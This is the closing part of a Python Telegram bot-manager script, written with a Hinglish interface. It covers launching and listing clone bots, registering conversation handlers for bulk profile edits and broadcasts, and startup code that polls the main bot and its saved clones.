                  f"✔️ ꜱᴀᴍᴇ ꜰɪʟᴇ — ɴᴏ ꜱᴇᴘᴀʀᴀᴛᴇ ᴅᴇᴘʟᴏʏᴍᴇɴᴛ ɴᴇᴇᴅᴇᴅ\n"
                  f"✔️ ᴀʟʟ ꜰᴇᴀᴛᴜʀᴇꜱ ᴡᴏʀᴋɪɴɢ\n"
                  f"✔️ ᴅᴀᴛᴀ: clone_data_{owner_id}/")
    else:
        status = (f"⚠️ ᴄʟᴏɴᴇ ꜱᴀᴠᴇᴅ ʙᴜᴛ ꜱᴛᴀʀᴛ ꜰᴀɪʟᴇᴅ\n"
                  f"ʙᴏᴛ ʀᴇꜱᴛᴀʀᴛ ᴘᴇ ᴀᴜᴛᴏ ʟᴏᴀᴅ ʜᴏɢᴀ.")

    await prog.edit_text(status, parse_mode=ParseMode.HTML)

    # ── Notify clone owner via their bot ──────────────────────────────────────
    try:
        await _tg_post(clone_tok, "sendMessage", {
            "chat_id": owner_id,
            "text": (f"🎉 <b>Tumhara bot @{clone_user} LIVE ho gaya!</b>\n\n"
                     f"Ab seedha /start karo is bot mein.\n"
                     f"Tumhara ID: <code>{owner_id}</code>"),
            "parse_mode": "HTML"
        })
    except Exception:
        pass

    await update.message.reply_text(
        "✅ ᴄʟᴏɴᴇ ᴄᴏᴍᴘʟᴇᴛᴇ", reply_markup=owner_kb(uid))
    context.user_data.pop("_clone_token", None)
    context.user_data.pop("_clone_name", None)
    context.user_data.pop("_clone_username", None)
    return ConversationHandler.END


async def clone_database(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    uid = update.effective_user.id
    if not is_main_owner(uid):
        await update.message.reply_text("❌ ꜱɪʀꜰ ᴍᴀɪɴ ᴏᴡɴᴇʀ ᴋᴇ ʟɪʏᴇ")
        return ConversationHandler.END
    data   = load_data()
    clones = data.get("clones", {})
    if not clones:
        await update.message.reply_text(
            "📭 <b>Koi clone registered nahi hai</b>\n\nPehle 🤖 Clone Bot se ek clone banao.",
            parse_mode=ParseMode.HTML, reply_markup=owner_kb(uid))
        return ConversationHandler.END
    txt = f"🗄 <b>ᴄʟᴏɴᴇ ᴅᴀᴛᴀʙᴀꜱᴇ</b> — {len(clones)} ᴄʟᴏɴᴇꜱ\n\n"
    for oid, info in clones.items():
        txt += (f"👤 <b>@{info.get('username','?')}</b> — ID: <code>{oid}</code>\n"
                f"   🤖 Bot: <b>{info.get('name','?')}</b>\n"
                f"   📅 {info.get('created_at','?')}\n\n")
    await update.message.reply_text(
        txt + "Kisi clone ko select karo 👇",
        parse_mode=ParseMode.HTML,
        reply_markup=clone_db_kb(clones))
    context.user_data["_clone_db_map"] = {
        f"@{info.get('username','?')}".upper(): oid
        for oid, info in clones.items()
    }
    return WAIT_CLONE_VIEW


async def clone_view_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    uid   = update.effective_user.id
    t     = _norm(update.message.text).upper()
    if "MAIN MENU" in t:
        await update.message.reply_text("↩️", reply_markup=main_kb(uid))
        return ConversationHandler.END
    if "VIEW BOTS" in t:
        sel_oid = context.user_data.get("_selected_clone_oid","")
        if not sel_oid:
            await update.message.reply_text("❌ Pehle ek clone select karo.", reply_markup=clone_db_kb(load_data().get("clones",{})))
            return WAIT_CLONE_VIEW
        clone_bots = load_data().get("clone_bots",{}).get(str(sel_oid),{})
        if not clone_bots:
            await update.message.reply_text(f"📭 <b>Is clone owner ne koi bot add nahi kiya hai abhi tak.</b>", parse_mode=ParseMode.HTML, reply_markup=clone_action_kb())
        else:
            lines = [f"🤖 <b>Clone {sel_oid} ke bots ({len(clone_bots)}):</b>\n"]
            for i,(tok,info) in enumerate(clone_bots.items(),1):
                lines.append(f"{i}. <b>{info.get('name','?')}</b> @{info.get('username','?')}")
            await update.message.reply_text("\n".join(lines), parse_mode=ParseMode.HTML, reply_markup=clone_action_kb())
        return WAIT_CLONE_VIEW
    # Check if a clone was selected from keyboard
    db_map = context.user_data.get("_clone_db_map", {})
    for key, oid in db_map.items():
        if key.strip("@ ") in t.strip("@ ") or t.strip("@ ") in key.strip("@ "):
            context.user_data["_selected_clone_oid"] = oid
            data   = load_data()
            clones = data.get("clones", {})
            info   = clones.get(str(oid), {})
            await update.message.reply_text(
                f"👤 <b>Clone Owner Info</b>\n\n"
                f"🤖 ʙᴏᴛ: <b>@{info.get('username','?')}</b> ({info.get('name','?')})\n"
                f"👤 ᴏᴡɴᴇʀ ɪᴅ: <code>{oid}</code>\n"
                f"📅 ᴄʀᴇᴀᴛᴇᴅ: {info.get('created_at','?')}\n\n"
                "Kya karna hai?",
                parse_mode=ParseMode.HTML, reply_markup=clone_action_kb())
            return WAIT_CLONE_VIEW
    await update.message.reply_text("👇 Clone select karo:", reply_markup=clone_db_kb(load_data().get("clones",{})))
    return WAIT_CLONE_VIEW


class MultiApp(Application):
    """Application subclass that sets _BOT_CFG ContextVar before each update
    so load_data/save_data/is_owner automatically use the right config."""
    async def process_update(self, update):
        cfg = _BOT_CONFIGS.get(self.bot.id)
        tok = _BOT_CFG.set(cfg or {})
        try:
            return await super().process_update(update)
        finally:
            _BOT_CFG.reset(tok)


def _build_app(token: str) -> MultiApp:
    return (
        Application.builder()
        .application_class(MultiApp)
        .token(token)
        .defaults(Defaults(protect_content=True))
        .concurrent_updates(False)
        .read_timeout(8.0).write_timeout(8.0)
        .connect_timeout(5.0)
        .build()
    )


async def launch_clone_app(token: str, owner_id: int, clone_data_dir: "Path"):
    """Start a clone bot in this process — full features, separate data."""
    try:
        app = _build_app(token)
        _register_all_handlers(app)
        await app.initialize()
        bot_id = app.bot.id
        clone_data_dir.mkdir(parents=True, exist_ok=True)
        _BOT_CONFIGS[bot_id] = {
            "owner_id":  owner_id,
            "data_file": clone_data_dir / "ʙᴏᴛꜱ_data.json",
            "is_main":   False,
        }
        await app.start()
        await app.updater.start_polling(drop_pending_updates=True, poll_interval=1.0)
        _RUNNING_APPS[bot_id] = app
        logger.info("Clone started: bot_id=%s owner=%s", bot_id, owner_id)
        return app
    except Exception as e:
        logger.error("Clone launch failed token=%s: %s", token[:20], e)
        return None


def _register_all_handlers(app):
    """Register every handler on any Application — called for main + each clone."""
    import asyncio as _asyncio

    class _CancelFilter(filters.MessageFilter):
        KEYS = ("VIEW", "SEND", "BROADCAST", "CHANGE", "OWNER", "MAIN", "BACK",
                "ADD", "REMOVE", "ADMIN", "SERVER", "ALL", "MULTI", "LIST",
                "DONE", "CLEAR", "PRIVATE", "DEL", "SELECT",
                "FILE", "ADDED", "BOT", "MY BOT", "TOKEN", "STATUS",
                "PHOTO", "BIO", "DESC", "NAME", "MESSAGE")
        def filter(self, message):
            if not message or not message.text:
                return False
            t = _norm(message.text).upper()
            return any(k in t for k in self.KEYS)
    cancel_pat = _CancelFilter()

    class _LabelFilter(filters.MessageFilter):
        def __init__(self, keys):
            super().__init__()
            self.keys = [k.upper() for k in keys]
        def filter(self, message):
            if not message or not message.text:
                return False
            t = _norm(message.text).upper()
            return any(k in t for k in self.keys)

    def entry(label_parts):
        return _LabelFilter(list(label_parts))

    # Conversations first
    app.add_handler(ConversationHandler(
        entry_points=[MessageHandler(entry(["ADD BOT TOKEN"]), add_token_start)],
        states={WAIT_ADD_TOKEN: [MessageHandler(filters.TEXT & ~filters.COMMAND, add_token_recv)]},
        fallbacks=[CommandHandler("cancel", cancel), MessageHandler(cancel_pat, cancel_and_route)],
        allow_reentry=True,
    ))
    app.add_handler(ConversationHandler(
        entry_points=[MessageHandler(entry(["CHANGE NAME"]), name_start)],
        states={
            WAIT_NAME_MODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, name_mode)],
            WAIT_NAME:      [MessageHandler(filters.TEXT & ~filters.COMMAND, name_recv)],
            WAIT_NAME_ALL:  [MessageHandler(filters.TEXT & ~filters.COMMAND, name_recv_all)],
        },
        fallbacks=[CommandHandler("cancel", cancel), MessageHandler(cancel_pat, cancel_and_route)],
        allow_reentry=True,
    ))
    app.add_handler(ConversationHandler(
        entry_points=[MessageHandler(entry(["CHANGE BIO"]), bio_start)],
        states={
            WAIT_BIO_MODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, bio_mode)],
            WAIT_BIO:      [MessageHandler(filters.TEXT & ~filters.COMMAND, bio_recv)],
            WAIT_BIO_ALL:  [MessageHandler(filters.TEXT & ~filters.COMMAND, bio_recv_all)],
        },
        fallbacks=[CommandHandler("cancel", cancel), MessageHandler(cancel_pat, cancel_and_route)],
        allow_reentry=True,
    ))
    app.add_handler(ConversationHandler(
        entry_points=[MessageHandler(entry(["CHANGE DESC"]), desc_start)],
        states={WAIT_DESC: [MessageHandler(filters.TEXT & ~filters.COMMAND, desc_recv)]},
        fallbacks=[CommandHandler("cancel", cancel), MessageHandler(cancel_pat, cancel_and_route)],
        allow_reentry=True,
    ))
    app.add_handler(ConversationHandler(
        entry_points=[MessageHandler(entry(["CHANGE PHOTO"]), photo_start)],
        states={
            WAIT_PHOTO_MODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, photo_mode)],
            WAIT_PHOTO:      [MessageHandler(filters.PHOTO, photo_recv)],
        },
        fallbacks=[CommandHandler("cancel", cancel), MessageHandler(cancel_pat, cancel_and_route)],
        allow_reentry=True,
    ))
    app.add_handler(ConversationHandler(
        entry_points=[MessageHandler(entry(["BOT MESSAGE"]), send_bot_start)],
        states={
            WAIT_SEND_CHAT: [MessageHandler(filters.TEXT & ~filters.COMMAND, send_bot_chat)],
            WAIT_SEND_CONTENT: [MessageHandler((filters.TEXT | filters.PHOTO | filters.VIDEO | filters.Document.ALL) & ~filters.COMMAND, send_bot_content)],
        },
        fallbacks=[CommandHandler("cancel", cancel), MessageHandler(cancel_pat, cancel_and_route)],
        allow_reentry=True,
    ))
    app.add_handler(ConversationHandler(
        entry_points=[MessageHandler(entry(["SEND TO USER ID", "SEND TO USER"]), send_uid_start)],
        states={
            WAIT_SEND_UID: [MessageHandler(filters.TEXT & ~filters.COMMAND, send_uid_recv)],
            WAIT_SEND_UID_CONTENT: [MessageHandler((filters.TEXT | filters.PHOTO | filters.VIDEO | filters.Document.ALL) & ~filters.COMMAND, send_uid_content)],
        },
        fallbacks=[CommandHandler("cancel", cancel), MessageHandler(cancel_pat, cancel_and_route)],
        allow_reentry=True,
    ))
    app.add_handler(ConversationHandler(
        entry_points=[MessageHandler(entry(["ADD USER"]), multi_uid_start)],
        states={
            WAIT_MULTI_UID: [MessageHandler(filters.TEXT & ~filters.COMMAND, multi_uid_recv)],
        },
        fallbacks=[CommandHandler("cancel", cancel), MessageHandler(cancel_pat, cancel_and_route)],
        allow_reentry=True,
    ))
    app.add_handler(ConversationHandler(
        entry_points=[MessageHandler(entry(["SEND TO THIS USER"]), send_to_selected_start)],
        states={
            WAIT_PICK_USER_SEND: [MessageHandler((filters.TEXT | filters.PHOTO | filters.VIDEO | filters.Document.ALL) & ~filters.COMMAND, send_to_selected_content)],
        },
        fallbacks=[CommandHandler("cancel", cancel), MessageHandler(cancel_pat, cancel_and_route)],
        allow_reentry=True,
    ))
    # ── BROADCAST FILE (specific — must come BEFORE generic BROADCAST) ──
    app.add_handler(ConversationHandler(
        entry_points=[MessageHandler(entry(["BROADCAST FILE"]), broadcast_file_start)],
        states={WAIT_FILE_BROADCAST: [MessageHandler(
            (filters.TEXT | filters.PHOTO | filters.VIDEO | filters.Document.ALL) & ~filters.COMMAND,
            broadcast_file_content,
        )]},
        fallbacks=[CommandHandler("cancel", cancel), MessageHandler(cancel_pat, cancel_and_route)],
        allow_reentry=True,
    ))
    # ── BROADCAST ADDED (specific — must come BEFORE generic BROADCAST) ──
    app.add_handler(ConversationHandler(
        entry_points=[MessageHandler(entry(["BROADCAST ADDED"]), broadcast_added_start)],
        states={WAIT_ADDED_BROADCAST: [MessageHandler(
            (filters.TEXT | filters.PHOTO | filters.VIDEO | filters.Document.ALL) & ~filters.COMMAND,
            broadcast_added_content,
        )]},
        fallbacks=[CommandHandler("cancel", cancel), MessageHandler(cancel_pat, cancel_and_route)],
        allow_reentry=True,
    ))
    app.add_handler(ConversationHandler(
        entry_points=[MessageHandler(entry(["BROADCAST"]), broadcast_start)],
        states={WAIT_BROADCAST: [MessageHandler((filters.TEXT | filters.PHOTO | filters.VIDEO | filters.Document.ALL) & ~filters.COMMAND, broadcast_content)]},
        fallbacks=[CommandHandler("cancel", cancel), MessageHandler(cancel_pat, cancel_and_route)],
        allow_reentry=True,
    ))
    app.add_handler(ConversationHandler(
        entry_points=[MessageHandler(entry(["BY USER ID"]), by_user_start)],
        states={WAIT_USER_VIEW: [MessageHandler(filters.TEXT & ~filters.COMMAND, by_user_recv)]},
        fallbacks=[CommandHandler("cancel", cancel), MessageHandler(cancel_pat, cancel_and_route)],
        allow_reentry=True,
    ))
    app.add_handler(ConversationHandler(
        entry_points=[MessageHandler(entry(["ADD ADMIN"]), add_admin_start)],
        states={WAIT_ADD_ADMIN: [MessageHandler(filters.TEXT & ~filters.COMMAND, add_admin_recv)]},
        fallbacks=[CommandHandler("cancel", cancel)],
        allow_reentry=True,
    ))
    app.add_handler(ConversationHandler(
        entry_points=[MessageHandler(entry(["REMOVE ADMIN"]), rem_admin_start)],
        states={WAIT_REMOVE_ADMIN: [MessageHandler(filters.TEXT & ~filters.COMMAND, rem_admin_recv)]},
        fallbacks=[CommandHandler("cancel", cancel)],
        allow_reentry=True,
    ))

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("setup", setup_owner_cmd))
    app.add_handler(CommandHandler("cancel", cancel))
    # Clone Bot handlers (main owner only)
    app.add_handler(ConversationHandler(
        entry_points=[MessageHandler(entry(["CLONE BOT"]), clone_bot_start)],
        states={
            WAIT_CLONE_TOKEN: [MessageHandler(filters.TEXT & ~filters.COMMAND, clone_token_recv)],
            WAIT_CLONE_OWNER: [MessageHandler(filters.TEXT & ~filters.COMMAND, clone_owner_recv)],
        },
        fallbacks=[CommandHandler("cancel", cancel), MessageHandler(cancel_pat, cancel_and_route)],
        allow_reentry=True,
    ))
    app.add_handler(ConversationHandler(
        entry_points=[MessageHandler(entry(["CLONE DATABASE"]), clone_database)],
        states={
            WAIT_CLONE_VIEW: [MessageHandler(filters.TEXT & ~filters.COMMAND, clone_view_handler)],
        },
        fallbacks=[CommandHandler("cancel", cancel), MessageHandler(cancel_pat, cancel_and_route)],
        allow_reentry=True,
    ))
    app.add_handler(ConversationHandler(
        entry_points=[MessageHandler(entry(["PROFILE TEXT"]), profile_text_start)],
        states={
            WAIT_PROFILE_ACTION:    [MessageHandler(filters.TEXT & ~filters.COMMAND, profile_action_handler)],
            WAIT_PROFILE_TOKEN:     [MessageHandler(filters.TEXT & ~filters.COMMAND, profile_token_recv)],
            WAIT_PROFILE_DESC:      [MessageHandler(filters.TEXT & ~filters.COMMAND, profile_desc_recv)],
            WAIT_PROFILE_SHORT:     [MessageHandler(filters.TEXT & ~filters.COMMAND, profile_short_recv)],
            WAIT_PROFILE_DESC_ALL:  [MessageHandler(filters.TEXT & ~filters.COMMAND, profile_desc_all_recv)],
            WAIT_PROFILE_SHORT_ALL: [MessageHandler(filters.TEXT & ~filters.COMMAND, profile_short_all_recv)],
        },
        fallbacks=[CommandHandler("cancel", cancel), MessageHandler(cancel_pat, cancel_and_route)],
        allow_reentry=True,
    ))
    app.add_handler(CallbackQueryHandler(callback_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_edit_text), group=-1)

    # Central menu router — catches all reply keyboard presses
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, menu_router), group=0)

    app.add_handler(MessageHandler(filters.ALL & ~filters.COMMAND, log_msg), group=1)

    # Auto file token extractor — runs independently for ALL documents from admin
    app.add_handler(MessageHandler(filters.Document.ALL & ~filters.COMMAND, handle_file_for_tokens), group=2)


    async def _global_error_handler(update, context):
        global _STYLE_SUPPORTED
        err = str(context.error).lower()
        _color_keywords = (
            "button style", "keyboardbutton", "button color", "invalid color",
            "unknown field 'style'", "can't parse reply markup", "invalid style",
        )
        if any(x in err for x in _color_keywords):
            _STYLE_SUPPORTED = False
            logger.info("Telegram rejected button color → switching to plain buttons")
        else:
            logger.error("Unhandled: %s", context.error)
    app.add_error_handler(_global_error_handler)


def main():
    import asyncio as _asyncio

    # ── Main bot application ────────────────────────────────────────────────
    main_app = _build_app(MAIN_BOT_TOKEN)
    _register_all_handlers(main_app)

    async def _run():
        await main_app.initialize()
        main_bot_id = main_app.bot.id
        _BOT_CONFIGS[main_bot_id] = {
            "owner_id":  OWNER_ID,
            "data_file": DATA_FILE,
            "is_main":   True,
        }
        _RUNNING_APPS[main_bot_id] = main_app
        await main_app.start()
        await main_app.updater.start_polling(
            allowed_updates=Update.ALL_TYPES,
            drop_pending_updates=True,
            poll_interval=0.8,
        )
        print("=" * 50)
        print("PREMIUM BOT MANAGER v6.10 STARTED")
        print(f"DATA_DIR = {_DATA_DIR}")

        # ── Start all registered clones ────────────────────────────────────
        clones = load_data().get("clones", {})
        for oid_str, info in clones.items():
            tok  = info.get("token","")
            oid  = int(info.get("owner_id", oid_str))
            cdir = _DATA_DIR.parent / f"clone_data_{oid}"
            if tok:
                _asyncio.ensure_future(launch_clone_app(tok, oid, cdir))

        print("=" * 50)
        # Keep alive
        await _asyncio.Event().wait()

    _asyncio.set_event_loop(_asyncio.new_event_loop())
    _asyncio.get_event_loop().run_until_complete(_run())


async def _pre_start_cleanup():
    """Delete webhook + clear pending updates before polling.
    Prevents 409 Conflict when old instance is still running."""
    import httpx
    try:
        async with httpx.AsyncClient(timeout=10) as cl:
            r = await cl.get(
                f"https://api.telegram.org/bot{MAIN_BOT_TOKEN}/deleteWebhook",
                params={"drop_pending_updates": "true"},
            )
            print(f"[CLEANUP] deleteWebhook → {r.json().get('description','ok')}")
    except Exception as e:
        print(f"[CLEANUP] webhook clear failed (ok to ignore): {e}")


if __name__ == "__main__":
    import asyncio
    # ── Step 1: kill any webhook / pending updates ──
    asyncio.set_event_loop(asyncio.new_event_loop())
    asyncio.get_event_loop().run_until_complete(_pre_start_cleanup())
    # ── Step 2: start bot ──
    main()
